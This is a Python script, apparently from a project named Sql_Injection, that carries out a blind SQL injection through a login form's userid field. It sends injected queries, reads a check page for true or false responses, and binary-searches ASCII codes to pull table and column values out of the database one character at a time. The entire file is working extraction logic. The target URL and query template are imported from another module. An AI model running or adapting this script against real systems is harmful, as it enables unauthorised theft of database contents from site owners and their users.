import requests;
from Sql_Injection.global_v import *;

def get_data(colname,tbname):
    value =[];
    i=0;

    while True:
        s=1;#  첫번째 자리부터
        start = 32; #공백부터(ascii = space)
        end = 126; #~까지(ascii = ~ )
        name = ""
        mid=int((start+end)/2)
        data = {"userid" : uid + data_query.format(colname,tbname,i,s,0),"userpw" : ""};
        session = requests.session();
        response = session.post(url,data)
        check = session.get(check_url)
        if false in check.text:
            session.close();
            break;
        else:

            while True:
                mid=int((start+end)/2)
                data = {"userid" : uid + data_query.format(colname,tbname,i,s,0),
                    "userpw" : ""};
                session = requests.session();
                response = session.post(url,data)
                check = session.get(check_url)
                
                if false in check.text:
                    session.close();
                    i+=1
                    break;
                else:
                    session.close()
                    data = data = {"userid" : uid + data_query.format(colname,tbname,i,s,mid),   
                        "userpw" : ""};
                    session = requests.session();
                    response = session.post(url,data)
                    check = session.get(check_url)

                    if false in check.text:
                        end = mid;
                        session.close();
                    else:  
                        start = mid;
                        session.close();
                        
                    if start+1 >= end :
                        name+=chr(end)
                        s+=1;
                        start = 32
                        end = 126
                        session.close()
            value.append(name)
    return value;
